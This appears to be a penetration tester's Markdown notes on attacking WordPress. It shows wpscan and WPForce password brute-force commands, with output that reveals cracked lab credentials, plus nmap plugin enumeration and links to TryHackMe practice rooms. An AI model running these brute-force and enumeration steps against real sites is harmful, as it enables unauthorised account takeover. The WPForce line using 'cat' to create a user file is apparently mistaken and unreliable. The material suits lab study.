# WordPress

## wpscan

[https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)  

Check and install wpscan
```
# apt info wpscan
Package: wpscan
Version: 3.8.10-0kali1
Priority: optional
Section: non-free/utils
Maintainer: Kali Developers <devel@kali.org>
Installed-Size: 403 kB
Depends: curl, ruby | ruby-interpreter, ruby-activesupport, ruby-cms-scanner (>= 0.12.1), ruby-yajl
Homepage: http://www.wpscan.org
Ruby-Versions: all
Download-Size: 59.0 kB
APT-Sources: http://http.kali.org/kali kali-rolling/non-free amd64 Packages
Description: Black box WordPress vulnerability scanner
 WPScan scans remote WordPress installations to find security issues.

# apt install wpscan

```


Brute force password
```bash
# wpscan --url http://10.10.87.140/wordpress -U elyana -P pass2.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.10
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.87.140/wordpress/ [10.10.87.140]
[+] Started: Fri Dec 11 19:43:00 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.87.140/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.87.140/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.87.140/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.87.140/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.87.140/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.87.140/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.87.140/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://10.10.87.140/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://10.10.87.140/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.87.140/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.87.140/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.87.140/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.87.140/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.87.140/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2019-05-10T16:05:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.87.140/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=======================================================================> (22 / 22) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elyana / H@ckme@123
Trying elyana / #H@ckme@123 Time: 00:00:01 <===================================                                    > (14 / 28) 50.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elyana, Password: H@ckme@123

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Dec 11 19:43:08 2020
[+] Requests Done: 38
[+] Cached Requests: 38
[+] Data Sent: 17.433 KB
[+] Data Received: 101.96 KB
[+] Memory used: 190.922 MB
[+] Elapsed time: 00:00:07
```

Ignore SSL certificate   
```
wpscan --url https://10.10.73.30/wp-login.php --disable-tls-checks
```

## /xmlrpc.php

## WPForce

[https://github.com/n00py/WPForce](https://github.com/n00py/WPForce)  

```
root@X220:/opt/WPForce# export target=10.10.147.113
root@X220:/opt/WPForce# cat 'Elliot' >> user.txt
root@X220:/opt/WPForce# python2 ./wpforce.py -i user.txt -w /usr/share/wordlists/rockyou.txt -u http://$target
```

Example using hydra
![Using hydra to brute force login passsword](https://github.com/tuyendq/lthwpentest/blob/master/hydra-http-post-form-1.png)

## nmap
```bash
# nmap -p 8080 --script=http-wordpress-enum --script-args search-limit=1500 -vv 127.0.0.1
Completed NSE at 10:37, 862.44s elapsed
Nmap scan report for localhost (127.0.0.1)
Host is up, received localhost-response (0.00013s latency).
Scanned at 2021-03-13 10:23:17 +07 for 862s

PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 64
| http-wordpress-enum:
| Search limited to top 1500 themes/plugins
|   themes
|     twentyseventeen 1.5
|   plugins
|     akismet
|     duplicator 1.3.26
|_    wp-file-manager 6.0

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 862.80 seconds
           Raw packets sent: 1 (44B) | Rcvd: 2 (88B)
#
```

## Reference

https://www.hackingarticles.in/wordpress-reverse-shell/

## Practice

[THM | Blog](https://tryhackme.com/room/blog)  
[THM | All in One](https://tryhackme.com/room/allinonemj)  
[THM | Mr Robot](https://tryhackme.com/room/mrrobot)  
[THM | Colddbox easy](https://tryhackme.com/room/colddboxeasy)


